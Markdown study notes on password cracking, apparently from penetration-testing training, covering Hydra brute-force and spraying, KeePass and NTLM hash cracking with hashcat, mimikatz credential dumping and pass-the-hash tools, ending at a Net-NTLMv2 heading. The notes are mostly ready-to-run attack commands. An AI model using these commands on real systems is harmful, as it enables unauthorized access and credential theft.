---
title: Password cracking notes and checklist
updated: 2024-01-06 21:14:14Z
created: 2024-01-06 11:29:11Zkal
---

# Password cracking notes and checklist

- [ ] **Hashcat** in mainly used for GPU-based and **JohnTheRipper** for CPU-Based
- [ ] For most algorithms a GPU is much faster, but apparently no for slow hashing algo such as `bcrypt`.

## Identify hashes

Tools : 
```bash
hashid # works better, for format specific password instantiate with single quotes 

hash-identifier
```

There is the usual hashes such as md5 or sh256 that are known. But to identify hashes for cracking we can look out for it here : [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)


## Using Hydra

- Brute-forcing `ssh`:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<IP>
```
- Password-spraying `rdp`:
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperDuperSecretPas0wrd" rdp://<IP>
```
- Password brute-forcing login page: 
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed."
```
- Password brute-forcing HTTP Authentication BASIC: 
```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt "http-get://<IP>/:A=BASIC"
```


## Password manager
### Keepass
Keepass manager database is stored as an `.kdbx` file. 
Locating the database with Powershell:
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Transforming the database to a readable format by `hashcat` an `john`:
```bash
keepass2john database.kdbx > keepass.hash
```

looking up the hash type : 
```bash
hashcat --help | grep -i "KeePass"
```

And finally starting the attack (rockyou-30000.rule is a hashcat provided rule): 
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## SSH passphrase brute force

## NTLM hashes

### NT LAN Manager (NTLM)

#### NTLM implementation
Windows stores hashed user passwords in the *Security Account Manager (SAM)* database file. 
The hashes are stored as NTLM hashes. NTLM stored in the SAM database are not salted. 

> *salts* are random bits appended to a password before hashing. 

#### Extracting SAM database
- Using *Mimikatz* and the *sekurlsa* module. The NTLM hashes are cached on the LSASS (Local Security authority Subsytem) process memory. Sekurlsa extracts the hashes from it. LSASS runs under SYSTEM user (more privilegd that Administrator). 

The conditions to extract passwords from the LSASS using mimikatz: 
- [ ] Adminstrator level or higher. 
- [ ] *SeDebugPrivilege* access right enabled. 

We can elevate our privileges to SYSTEM account with *PsExec* or Mimikaz's *token elevation function* (requires *SeImpersonatePrivilege* - default all local administrators).

- checking which users exist locally on the system:
```powershell
Get-LocalUser
```
- mimikatz usage : 
```powershell
# enable SeDebugPrivilege access (necessary for sekurlsa and lsadump)
privilege::debug

# Elevate to SYSTEM user privileges
token::elevate

# dump SAM
lsadump:sam

# extract plaintext passwords and password hashes from all available sources
sekurlsa::logonpasswords
```

- Identifying the hashcat mode : 
```bash
hashcat --help | grep -i "ntlm"
```

- starting hashcat (dumped NTLM hashes are directly usable):
```bash
hashcat -m 1000 user.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
``` 


#### Passing NTLM
The goal is to leverage an NTLM hash without cracking it. 

- *pass-the-hash* (PtH) makes it possible to authenticate to a local or remote target with a valid combination of username and NTLM hash rather than with a plaintext. 
- We can use the pass-the-hash with different tools specifically to what we are looking for :
    - SMB enumeration and management => `smbclient` or `crackmapexec`
    - Command execution => `psexec.py` or `wmiexec.py`
    - RDP with `WinRM`
    - PtH with mimikatz. 

### Net-NTLMv2
When we have an unprivileged user and we can't use Mimikatz, we can leverage Net-NTLMv2 network auth protocol. 
